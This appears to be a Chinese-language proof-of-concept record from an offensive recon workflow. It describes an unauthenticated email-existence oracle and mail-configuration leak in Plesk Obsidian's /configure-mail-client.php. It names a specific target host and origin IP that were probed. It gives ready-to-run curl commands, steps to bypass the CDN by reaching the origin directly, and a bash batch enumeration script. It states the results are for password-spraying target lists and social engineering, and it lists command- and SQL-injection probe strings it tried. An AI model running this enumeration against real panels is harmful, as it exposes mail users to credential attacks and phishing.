# Plesk Obsidian 18.0.81 /configure-mail-client.php 匿名邮箱存在性枚举 + 邮件客户端配置泄露

- **code**: plesk-obsidian-configure-mail-client-unauth-email-enum-mailc
- **kind**: poc
- **category**: info-leak
- **component**: Plesk Obsidian（sw-cp-server，面板 8880 明文 / 8443 / 443）
- **versions**: Plesk Obsidian 18.0.81（实测版本）
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: task#12 / finding_id=191（finding_checks.verdict=verified，findings.status=confirmed）。2026-11-12 11:20-11:30 UTC 在 ARTEX 工作机用 curl -sk --noproxy '*' 对 old.retro32.com:8880（源站 92.205.178.49）匿名实测，全程无 Cookie/Token：① GET /configure-mail-client.php?emailaddress=<该面板托管域下的已存在邮箱> → HTTP 200 / 98189B，initialData.values 回显 email/userName/domain/incomingServer/outgoingServer/imapPort=993/pop3Port=995/smtpPort=465/incomingProtocols/mobileConfigUrl；② 同端点换随机不存在邮箱 → HTTP 200 / 24B 固定 "Email address not found"；③ 不带参数 → HTTP 200 / 26B "Email address is required"（确认参数名为 emailaddress）；④ 四通道结果一致：CF 前置 http://old.retro32.com:8880、直连 http://92.205.178.49:8880、直连 https://92.205.178.49:8443、https://92.205.178.49:443（Host: webmail.retro32.com）；⑤ 阴性对照 7 组注入探针（单引号/双引号/;id/$(id)/|id/' OR '1'='1/%00）全部返回固定 "Email address not found" 且耗时恒 ~0.32s，排除 SQL/命令注入。原始响应落盘 body_cmc_found.html(98189B)、cmc_found_B.html、probe_B.txt。
- **path**: pocs/plesk-obsidian-configure-mail-client-unauth-email-enum-mailc/plesk_mailclient_enum.sh
- **tags**: plesk, plesk-obsidian, configure-mail-client, email-enumeration, oracle, info-leak, unauth, mail-config, mobileconfig, sw-cp-server
- **created_at**: 2026-11-12T11:41:44.717Z
- **engine**: http://old.retro32.com:8880（源站 92.205.178.49，Host: old.retro32.com）
- **found_by**: recon

## 描述

Plesk Obsidian 面板的 /configure-mail-client.php 在匿名态直接按 emailaddress 参数查询：存在的邮箱返回 200 + ~98KB 页面并在 initialData.values 回显该邮箱的 userName/domain/incomingServer/outgoingServer/IMAP 993/POP3 995/SMTP 465/mobileConfigUrl；不存在的邮箱返回固定文案 "Email address not found"，缺参返回 "Email address is required"。两个分支稳定可分，构成跨该 Plesk 上所有客户域的匿名邮箱存在性 oracle 与邮件客户端配置泄露，且该路径不经过面板登录限流，可用于定向邮箱枚举、口令喷洒目标筛选与社工。

## 用法

```
前置：目标为 Plesk Obsidian 面板（Server: sw-cp-server / login_up.php 可指纹），8880（明文）或 8443/443 任一通道可从攻击机直连，全程零 Cookie/零 Token。已知一个承载在该面板上的客户域即可开工（mail-client 配置页对同主机全部客户域生效）。
单发判据（三分支，看正文而不是只看状态码）：
  curl -sk --noproxy '*' -H 'X-Requested-With: XMLHttpRequest' \
    'http://<面板>:8880/configure-mail-client.php?emailaddress=user@example.com' \
    -o body.html -w '%{http_code} %{size_download}\n'
  · 200 + ~98KB 且 body 含 "initialData" 与 "userName":"user@example.com"  → 邮箱存在 + 配置泄露
  · 200 + 24B 左右、正文 "Email address not found"                          → 邮箱不存在
  · 200 + 26B 左右、正文 "Email address is required"                         → 参数名不对/没传 emailaddress
批量：bash plesk_mailclient_enum.sh http://<面板>:8880 -f emails.txt（每条间隔 1s）
多通道复核：CF 前置 8880、直连源站 8880、https://<源站>:8443、https://<源站>:443 + Host: webmail.<域> 四者结果应完全一致，据以排除 CDN/边缘差异。
注意：① 探针只对「该 Plesk 上托管域」的邮箱有效，用未托管域的地址一定回 not found（假阴性）；② 注入类载荷（单引号/双引号/;id/$(id)/|id/' OR '1'='1/%00）实测全部回固定 not found、耗时恒定，别再在这条路上花时间做 SQLi/命令注入；③ 部分面板被管理员关闭 mail client 配置功能或该站点隐藏时返回 404，属未启用而非不存在；④ 枚举是匿名且无登录限流，但要控制速率避免影响生产。
```

## 正文

```
# Plesk Obsidian /configure-mail-client.php 匿名邮箱存在性 oracle + 邮件客户端配置泄露

## 一句话
Plesk 面板的「邮件客户端配置」页在**未登录**状态下接受 `emailaddress` 参数并回显该邮箱的完整
收/发件服务器配置；存在与不存在两个分支返回体积/文案差异巨大 → 跨域邮箱枚举 oracle。

## 前置条件
- 目标是 Plesk Obsidian（指纹：`Server: sw-cp-server`、`/login_up.php`、Plesk 404 页 990B）
- 面板 8880 明文或 8443/443 任一通道可直连（前置 Cloudflare 时需拿到源站 IP 并手动带 `Host:`）
- 零认证：不需要 Cookie / Token / X-Requested-With 的值校验
- 需要一个候选邮箱；域必须是**承载在该 Plesk 上**的客户域

## 判据（三分支，一律看正文，不看状态码——三个分支都是 200）
| 分支 | 响应 | 含义 |
|---|---|---|
| A | 200 + ~98KB，正文含 `"initialData"` 与 `"userName":"<email>"` | 邮箱存在 + 配置泄露 |
| B | 200 + 约 24B，正文 `Email address not found`（尾部可能带换行） | 邮箱不存在 |
| C | 200 + 约 26B，正文 `Email address is required` | `emailaddress` 未传/拼错 |

A 分支泄露字段（`initialData.values`）：
`email` / `userName` / `domain` / `incomingServer` / `outgoingServer` /
`imapPort:993` / `pop3Port:995` / `smtpPort:465` / `incomingProtocols` /
`mobileConfigUrl`（形如 `https://<domain>/email.mobileconfig?emailaddress=<email>`）

## 单发复现
```bash
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'

# A：存在的邮箱
curl -sk --noproxy '*' -A "$UA" -H 'X-Requested-With: XMLHttpRequest' \
  'http://<panel-host>:8880/configure-mail-client.php?emailaddress=user@example.com' \
  -o found.html -w 'A %{http_code} %{size_download}\n'
grep -o '"values":{[^}]*}' found.html | head -c 600; echo

# B：不存在的邮箱
curl -sk --noproxy '*' -A "$UA" -H 'X-Requested-With: XMLHttpRequest' \
  'http://<panel-host>:8880/configure-mail-client.php?emailaddress=zzq-nosuch-9917@example.com' \
  -w '\nB %{http_code} %{size_download}\n'

# C：缺参确认真实参数名
curl -sk --noproxy '*' -A "$UA" -H 'X-Requested-With: XMLHttpRequest' \
  'http://<panel-host>:8880/configure-mail-client.php' \
  -w '\nC %{http_code} %{size_download}\n'
```

直连源站（绕过 CDN）：
```bash
curl -sk --noproxy '*' -H 'Host: <panel-vhost>' -A "$UA" -H 'X-Requested-With: XMLHttpRequest' \
  'http://<origin-ip>:8880/configure-mail-client.php?emailaddress=user@example.com' -o found.html -w '%{http_code} %{size_download}\n'
curl -sk --noproxy '*' -H 'Host: <panel-vhost>' ... 'https://<origin-ip>:8443/configure-mail-client.php?...'
curl -sk --noproxy '*' -H 'Host: webmail.<domain>' ... 'https://<origin-ip>/configure-mail-client.php?...'
```

## 批量枚举脚本
```bash
#!/usr/bin/env bash
# plesk_mailclient_enum.sh
# 用法:
#   bash plesk_mailclient_enum.sh http://panel:8880 user@example.com
#   bash plesk_mailclient_enum.sh http://panel:8880 -f emails.txt
#   HOSTHDR='panel-vhost' bash plesk_mailclient_enum.sh http://<origin-ip>:8880 -f emails.txt
# 直连源站必带 --noproxy '*'；走记录代理时去掉该参数并 export HTTPS_PROXY。
set -u
UA="${ARTEX_UA:-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36}"
BASE="${1:?base url}"; shift
HOSTHDR="${HOSTHDR:-}"
CURL=(curl -sk --noproxy '*' -A "$UA" -H 'X-Requested-With: XMLHttpRequest' -G)
[ -n "$HOSTHDR" ] && CURL+=(-H "Host: $HOSTHDR")
EP="$BASE/configure-mail-client.php"

probe() {
  local email="$1" body code size t
  body="$(mktemp)"
  read -r code size t < <("${CURL[@]}" --data-urlencode "emailaddress=$email" \
      -o "$body" -w '%{http_code} %{size_download} %{time_total}' "$EP")
  if grep -q 'Email address is required' "$body" 2>/dev/null; then
    echo "NO_PARAM | $email | $code $size ${t}s | 检查参数名/URL"
  elif grep -q 'Email address not found' "$body" 2>/dev/null; then
    echo "NOTFOUND | $email | $code $size ${t}s"
  elif grep -q '"userName"' "$body" 2>/dev/null && grep -qF "$email" "$body" 2>/dev/null; then
    echo "EXISTS   | $email | $code $size ${t}s"
    grep -o '"values":{[^}]*}' "$body" | head -c 800; echo
  else
    echo "UNKNOWN  | $email | $code $size ${t}s | 现场看 $body"
  fi
  rm -f "$body"
}

if [ "${1:-}" = "-f" ]; then
  while IFS= read -r e; do
    [ -z "$e" ] && continue
    case "$e" in \#*) continue;; esac
    probe "$e"
    sleep 1
  done < "$2"
else
  probe "$1"
fi
```
输出：`EXISTS / NOTFOUND / NO_PARAM / UNKNOWN` 四态，EXISTS 行后附 `initialData.values` 片段。

## 阴性对照（已实测封口，别再重走）
对 `emailaddress` 依次注入 `'`、`"`、`;id`、`$(id)`、`|id`、`' OR '1'='1`、`%00`：
全部返回固定 `Email address not found`，耗时恒 ~0.32s，与正常请求一致 → 该参数走严格查表，
**无 SQL 注入 / 命令注入**，不要再上 sqlmap 或命令拼接载荷。

## 常见失败原因
1. **not found 假阴性**：候选邮箱的域不在该 Plesk 上 → 构造枚举字典时只用目标面板已托管域
   （可从证书 SAN、DNS 历史、WHOIS、页面 mailto、Wayback 收集）。
2. **全站 404**：管理员关闭了 mail client 配置功能，或该虚拟主机未启用该页面 → 换通道
   （8880/8443/443）再确认一次，仍 404 则本条不成立。
3. **走 CDN 时结果异常**：Cloudflare 会覆写部分头并可能缓存 → 拿源站 IP 直连 + 手动 `Host:`。
4. **被代理 MITM/拦截**：本地 `HTTP_PROXY` 会导致读到隧道内容，务必 `--noproxy '*'` 并 `unset *_proxy`。
5. **参数名写错**：C 分支的 `Email address is required` 就是参数名探针，看到它就说明 `emailaddress` 正确。

## 价值与后续
- 跨该 Plesk 上**全部客户域**的匿名邮箱存在性判定，无登录限流面；
- 命中即可拿到完整 IMAP/POP3/SMTP 端点与 `.mobileconfig` 下载地址，可直接作为
  口令喷洒/弱口令验证的目标清单，或配合社工邮件；
- 与 Plesk 前端 sourcemap（/cp/javascript/*.js.map）、8880 XML-RPC 等面组合，可进一步收敛面板暴露面。

```
